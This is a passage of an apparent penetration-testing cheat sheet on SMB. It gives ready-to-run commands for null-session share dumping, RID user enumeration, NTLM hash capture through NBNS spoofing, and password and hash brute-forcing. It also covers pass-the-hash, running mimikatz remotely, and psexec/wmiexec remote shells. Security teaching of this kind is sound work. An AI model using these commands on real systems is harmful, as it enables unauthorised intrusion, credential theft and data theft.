</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb8.png" alt="OS Detection with SMB OS Discovery script " data-proofer-ignore> <em>OS Detection with SMB OS Discovery script</em></p><h3 id="the-content-of-anonymous-shares-null-session-can-be-listed"><span class="mr-2">The content of anonymous shares (<code class="language-plaintext highlighter-rouge"><span class="mr-2">NULL Session</code>) can be listed.</span><a href="#the-content-of-anonymous-shares-null-session-can-be-listed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-L</span> 10.10.x.x <span class="nt">-N</span>
smbmap <span class="nt">-H</span> 10.10.x.x
smbmap <span class="nt">-H</span> 10.10.x.x <span class="nt">-R</span>
net use <span class="se">\\</span>10.10.x.x<span class="se">\I</span>PC<span class="nv">$ </span><span class="s2">""</span> /u:<span class="s2">""</span>
rpcclient 10.10.x.x <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span>
</pre></table></code></div></div><h3 id="shares-and-authorization-can-be-listed-with-guest-authorization"><span class="mr-2">Shares and authorization can be listed with Guest authorization.</span><a href="#shares-and-authorization-can-be-listed-with-guest-authorization" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbget <span class="nt">-a</span> smb://10.10.x.x/SharedFolder <span class="nt">-R</span>
</pre></table></code></div></div><h3 id="download-the-anonymous-shares-null-session"><span class="mr-2">Download the anonymous shares (<code class="language-plaintext highlighter-rouge"><span class="mr-2">NULL Session</code>)</span><a href="#download-the-anonymous-shares-null-session" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If you have the necessary privileges after running the command below, you can download the files in that file..</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbmap <span class="nt">-H</span> 192.168.x.x
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb12.png" alt="Enum Shares &amp; Privileges" data-proofer-ignore></p><p>First, let’s access the shared file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>192.168.x.x<span class="se">\\</span>shared_folder
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb13.png" alt="Access the shared File" data-proofer-ignore></p><p>When using smbclient to copy a directory, make sure to use the <code class="language-plaintext highlighter-rouge">recurse</code> and <code class="language-plaintext highlighter-rouge">prompt</code> commands. This makes it possible to non-interactively copy a directory and all of its contents. Then let’s run the following commands.</p><blockquote class="prompt-warning"><div><p>Caution will download all the files. Run smbclient in the directory where you will download the files.</p></div></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>smb: <span class="se">\&gt;</span> prompt
smb: <span class="se">\&gt;</span> recurse
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb14.png" alt="Download All shared Folder" data-proofer-ignore></p><p><img data-src="/assets/img/pitcures/smb/smb15.png" alt="Download All shared Folder" data-proofer-ignore></p><h3 id="shared-printers-can-be-detected"><span class="mr-2">Shared printers can be detected.</span><a href="#shared-printers-can-be-detected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>net view <span class="se">\\</span>10.10.x.x
</pre></table></code></div></div><h3 id="printable-on-shared-printers"><span class="mr-2">Printable on shared printers.</span><a href="#printable-on-shared-printers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-print-text
</pre></table></code></div></div><h3 id="the-system-clock-and-the-initial-start-time-of-the-smb-service-can-be-determined"><span class="mr-2">The system clock and the initial start time of the SMB service can be determined.</span><a href="#the-system-clock-and-the-initial-start-time-of-the-smb-service-can-be-determined" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb2-time
</pre></table></code></div></div><h3 id="backdoors-left-on-the-computer-can-be-listed"><span class="mr-2">Backdoors left on the computer can be listed.</span><a href="#backdoors-left-on-the-computer-can-be-listed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>stuxnet-detect
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-double-pulsar-backdoor
</pre></table></code></div></div><h3 id="usernames-can-be-detected-with-the-rid-technique"><span class="mr-2">Usernames can be detected with the RID technique.</span><a href="#usernames-can-be-detected-with-the-rid-technique" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>crackmapexec smb 10.10.x.0/24 <span class="nt">-d</span> Domain <span class="nt">-u</span> Usernames.list <span class="nt">-p</span> Password.list –rid-brute
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-users
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_lookupsid
</pre></table></code></div></div><p>A general information gathering can be carried out. Obtain SMB server version, domain name, Nbtstat info, MAC address, operating system, users (querydispinfo and enumdomusers), shared directories, anonymous sharing control, password policy (via rpcclient), groups, members of groups, RID and SID info,… can be done.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-a</span> 10.10.x.x
</pre></table></code></div></div><h3 id="the-smb-service-can-be-started-thus-by-listening-to-the-network-the-ntlmlm-password-hashes-of-the-users-on-the-network-and-the-encrypted-challenge-values-can-be-collected"><span class="mr-2">The SMB service can be started. Thus, by listening to the network, the NTLM/LM password hashes of the users on the network and the encrypted Challenge values can be collected.</span><a href="#the-smb-service-can-be-started-thus-by-listening-to-the-network-the-ntlmlm-password-hashes-of-the-users-on-the-network-and-the-encrypted-challenge-values-can-be-collected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msf <span class="o">&gt;</span> use auxiliary/server/capture/smb
msf <span class="o">&gt;</span> use auxiliary/spoof/nbns/nbns_response
</pre></table></code></div></div><h3 id="valid-users-or-passwords-that-can-be-logged-in-can-be-detected"><span class="mr-2">Valid users or passwords that can be logged in can be detected.</span><a href="#valid-users-or-passwords-that-can-be-logged-in-can-be-detected" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-brute <span class="nt">--script-args</span> <span class="nv">userdb</span><span class="o">=</span>Usernames.list,passdb<span class="o">=</span>Passwords.list,smblockout<span class="o">=</span>1
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_login
hydra <span class="nt">-t</span> 2 <span class="nt">-L</span> Usernames.list <span class="nt">-P</span> Passwords.list <span class="nt">-M</span> IPAdresses.list <span class="nt">-s</span> TargetPort smb
medusa <span class="nt">-t</span> 2 <span class="nt">-T</span> 2 <span class="nt">-U</span> Usernames.list <span class="nt">-P</span> Passwords.list <span class="nt">-H</span> IPAdresses.list <span class="nt">-n</span> TargetPort <span class="nt">-M</span> smbnt
crackmapexec smb 10.10.x.x/24 <span class="nt">-d</span> secybr.local <span class="nt">-u</span> Usernames.list <span class="nt">-p</span> Passwords.list
</pre></table></code></div></div><h3 id="valid-login-users-or-password-hashes-can-be-identified"><span class="mr-2">Valid login users or password hashes can be identified.</span><a href="#valid-login-users-or-password-hashes-can-be-identified" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_login
hydra <span class="nt">-t</span> 2 <span class="nt">-L</span> Usernames.list <span class="nt">-P</span> Hashes.list <span class="nt">-M</span> TargetIPAdresses.list <span class="nt">-s</span> TargetPort <span class="nt">-m</span> <span class="s2">"LocalHash"</span> smb
medusa <span class="nt">-t</span> 2 <span class="nt">-T</span> 2 <span class="nt">-U</span> Usernames.list <span class="nt">-P</span> Hashes.list <span class="nt">-H</span> TargetIPAdresses.list <span class="nt">-n</span> TargetPort <span class="nt">-m</span> PASS:HASH <span class="nt">-M</span> smbnt
crackmapexec smb 10.10.x.x/24 <span class="nt">-d</span> secybr.local <span class="nt">-u</span> Usernames.list <span class="nt">-H</span> Hashes.list
</pre></table></code></div></div><h3 id="detailed-information-collection-can-be-performed-using-identity-information"><span class="mr-2">Detailed information collection can be performed using identity information.</span><a href="#detailed-information-collection-can-be-performed-using-identity-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>enum4linux <span class="nt">-u</span> secybr.local<span class="se">\\</span>0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-a</span> 10.10.x.x
</pre></table></code></div></div><h3 id="shares-can-be-listed-using-credentials"><span class="mr-2">Shares can be listed using credentials.</span><a href="#shares-can-be-listed-using-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-shares <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span><span class="s1">'Password123!'</span> 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-ls <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span><span class="s1">'Password123!'</span>,share<span class="o">=</span>’SharedFolder’ 10.10.x.x
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-shares,smb-ls <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span><span class="s1">'Password123!'</span> 10.10.x.x
msf&gt; use auxiliary/scanner/smb/smb_enumshares
smbclient //10.10.x.x/SharedFolder <span class="nt">-U</span> secybr.local<span class="se">\\</span>0xhav0c
smbmap –host-file /path/to/TargetIPAddresses.list <span class="nt">-d</span> secybr.local <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-R</span>
smbmap <span class="nt">-H</span> 10.10.x.x <span class="nt">-R</span> SharedFolder <span class="nt">-A</span> SearchingFileName
pth-smbclient <span class="nt">-U</span> secybr.local/0xhav0c%aad3b435b51404eeaad3b435b51404ee //10.10.x.x/SharedFolder
crackmapexec smb 10.10.x.x/24 <span class="nt">-d</span> secybr.local <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">--shares</span>
crackmapexec smb 10.10.x.x/24 <span class="nt">-d</span> secybr.local <span class="nt">-u</span> 0xhav0c <span class="nt">-H</span> <span class="s1">'53f587baed383d5e8969457609f80a33333331a22a7e651:1b7951d1ee9e3363'</span> <span class="nt">--shares</span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb9.png" alt="accessing and downloading the known shared file with smbclient" data-proofer-ignore> <em>accessing and downloading the known shared file with smbclient</em></p><p><img data-src="/assets/img/pitcures/smb/smb10.png" alt="detecting shares, searching and downloading the known shared file with smbmap" data-proofer-ignore> <em>detecting shares, searching and downloading the known shared file with smbmap</em></p><h3 id="data-from-the-share-can-be-downloaded-using-credentials"><span class="mr-2">Data from the share can be downloaded using credentials.</span><a href="#data-from-the-share-can-be-downloaded-using-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>msf <span class="o">&gt;</span> use post/windows/gather/enum_shares
smbget smb://10.10.x.x/SharedFolder –user<span class="o">=</span>secybr.local<span class="se">\\</span>0xhav0c <span class="nt">-R</span>
mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>0xhav0c,password<span class="o">=</span>Password123!,domain<span class="o">=</span>secybr.local //10.10.x.x/SharedFolder /root/Desktop/SharedFile
smbmount //10.10.x.x/SharedFolder /root/Desktop/SharedFile <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>0xhav0c,password<span class="o">=</span>Password123!,rw
net use T: <span class="se">\\</span>10.10.x.x<span class="se">\S</span>haredFolder Password123! /user:secybr.local<span class="se">\0</span>xhav0c /savecred /p:no
</pre></table></code></div></div><h3 id="local-and-the-domain-the-computer-is-in-users-can-be-listed-using-their-credentials"><span class="mr-2">Local (and the domain the computer is in) users can be listed using their credentials.</span><a href="#local-and-the-domain-the-computer-is-in-users-can-be-listed-using-their-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-users <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_enumusers
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_enumusers_domain
</pre></table></code></div></div><h3 id="local-groups-can-be-listed-using-credentials"><span class="mr-2">Local groups can be listed using credentials.</span><a href="#local-groups-can-be-listed-using-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-groups <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x
</pre></table></code></div></div><h2 id="some-other-information-gathering-methods"><span class="mr-2">Some other information gathering methods.</span><a href="#some-other-information-gathering-methods" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c">#Password policy, users,… etc. about domain using credentials. information can be listed.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-domains <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x 

<span class="c">#Operating system information, hardware, web browser, … etc., using credentials. information can be listed.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-system-info <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x 

<span class="c">#Pipe information named using credentials can be listed.</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/pipe_auditor

<span class="c">#By using credentials, process information running in the operating system can be listed.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-processes <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x 

<span class="c">#Using the credentials, the service information running in the operating system can be listed.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-services <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x 

<span class="c">#Users who have logged in (in systems where local administrator authority can be obtained) can be listed using the username and password (or password summary) information.</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-enum-sessions <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x 
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/psexec_loggedin_users
crackmapexec smb 10.10.x.x/24 <span class="nt">-C</span> UsernamePassword.list –lusers

<span class="c">#Operating system SMB server statistics information can be listed using the credentials</span>
nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-server-stats <span class="nt">--script-args</span> <span class="nv">smbdomain</span><span class="o">=</span>secybr.local,smbuser<span class="o">=</span>0xhav0c,smbpass<span class="o">=</span>Password123! 10.10.x.x

<span class="c">#By using the credentials, the passwords registered in the Group Policy Preference in the domain the computer belongs to can be determined.</span>
msf <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_enum_gpp
</pre></table></code></div></div><h3 id="files-on-the-smb-share-can-be-retrieved-using-credentials"><span class="mr-2">Files on the SMB share can be retrieved using credentials.</span><a href="#files-on-the-smb-share-can-be-retrieved-using-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>smbclient //10.10.x.x/SharedFolder <span class="nt">-U</span> <span class="s1">'secybr.local\\0xhav0c'</span> <span class="s1">'Password123!'</span> <span class="nt">-p</span> TargetPort
recurse ON
prompt OFF
mget <span class="k">*</span>
</pre></table></code></div></div><h3 id="access-to-the-ms-rpc-command-line-can-be-achieved-using-credentials"><span class="mr-2">Access to the MS-RPC command line can be achieved using credentials.</span><a href="#access-to-the-ms-rpc-command-line-can-be-achieved-using-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rpcclient 10.10.x.x <span class="nt">-U</span> <span class="s1">'secybr.local\\0xhav0c'</span>
</pre></table></code></div></div><h3 id="command-can-be-run-by-using-username-and-password-information-in-systems-where-local-administrator-authority-can-be-obtained"><span class="mr-2">Command can be run by using username and password information (in systems where local administrator authority can be obtained).</span><a href="#command-can-be-run-by-using-username-and-password-information-in-systems-where-local-administrator-authority-can-be-obtained" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p445</span> <span class="nt">--script</span><span class="o">=</span>smb-psexec.nse <span class="nt">--script-args</span><span class="o">=</span><span class="nv">smbuser</span><span class="o">=</span>Username.list,smbpass<span class="o">=</span>Password.list 10.10.x.x
smbmap –host-file /FullPath/TargetIP.list <span class="nt">-d</span> secybr.local <span class="nt">-u</span> 0xhav0c <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-x</span> <span class="s2">"net user"</span>
winexe <span class="nt">-U</span> secybr.local<span class="se">\\</span>0xhav0c%Password123! //10.10.x.x <span class="s2">"net user"</span>
crackmapexec smb 10.10.x.x <span class="nt">-u</span> Username <span class="nt">-p</span> Password <span class="nt">-M</span> mimikatz <span class="nt">-o</span> <span class="nv">COMMAND</span><span class="o">=</span>privilege::debug
crackmapexec smb 10.10.x.x <span class="nt">-u</span> Username <span class="nt">-H</span> <span class="s1">'53f587baed383d5e8969457609f80sdfdsfdsfsda22a7e651:1b7951d1ee9e3363'</span> <span class="nt">-M</span> mimikatz <span class="nt">-o</span> <span class="nv">COMMAND</span><span class="o">=</span>privilege::debug
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/smb/smb11.png" alt="executing Mimikatz script from crackmapexec" data-proofer-ignore> <em>executing Mimikatz script from crackmapexec</em></p><h3 id="access-to-the-windows-command-line-meterpreter-cmd-powershell--can-be-achieved-by-using-the-username-and-password-information-in-systems-where-local-administrator-authority-can-be-obtained"><span class="mr-2">Access to the Windows command line (Meterpreter, CMD, Powershell, …) can be achieved by using the username and password information (in systems where local administrator authority can be obtained).</span><a href="#access-to-the-windows-command-line-meterpreter-cmd-powershell--can-be-achieved-by-using-the-username-and-password-information-in-systems-where-local-administrator-authority-can-be-obtained" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>winexe <span class="nt">-U</span> secybr.local<span class="se">\\</span>Username%Password //10.10.x.x <span class="s2">"cmd.exe"</span> –system
pth-winexe <span class="nt">-U</span> secybr.local/0xhav0c%aad3b435b51404eeaad3b435b51404ee //10.10.x.x cmd.exe –system

<span class="c">#Metasploit Framework</span>
msf <span class="o">&gt;</span> use exploit/windows/smb/psexec
msf <span class="o">&gt;</span> use exploit/windows/smb/psexec_psh
msf <span class="o">&gt;</span> use exploit/windows/smb/smb_delivery

<span class="c">#Impackets</span>
python psexec.py secybr.local/0xhav0c:Password123!@10.10.x.x
python smbexec.py secybr.local/0xhav0c:Password123!@10.10.x.x
python wmiexec.py secybr.local/0xhav0c:Password123!@10.10.x.x

<span class="c">#Windows Sysinternals: </span>
psexec.exe <span class="se">\\</span>10.10.x.x <span class="nt">-u</span> secybr.local<span class="se">\0</span>xhav0c <span class="nt">-p</span> Password cmd.exe /accepteula
</pre></table></code></div></div><h3 id="access-to-the-windows-command-line-meterpreter-cmd-powershell--can-be-achieved-by-using-the-username-and-password-summary-information-in-systems-where-local-administrator-authority-can-be-obtained"><span class="mr-2">Access to the Windows command line (Meterpreter, CMD, Powershell, …) can be achieved by using the username and password summary information (in systems where local administrator authority can be obtained).</span><a href="#access-to-the-windows-command-line-meterpreter-cmd-powershell--can-be-achieved-by-using-the-username-and-password-summary-information-in-systems-where-local-administrator-authority-can-be-obtained" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>pth-winexe <span class="nt">-U</span> secybr.local<span class="se">\\</span>0xhav0c%aad3b435b51404eeaad3b435b51404ee //10.10.x.x <span class="s2">"cmd.exe"</span> –system

<span class="c">#Metasploit Framework</span>
msf <span class="o">&gt;</span> use exploit/windows/smb/psexec
msf <span class="o">&gt;</span> use exploit/windows/smb/psexec_psh

<span class="c">#Impackets</span>
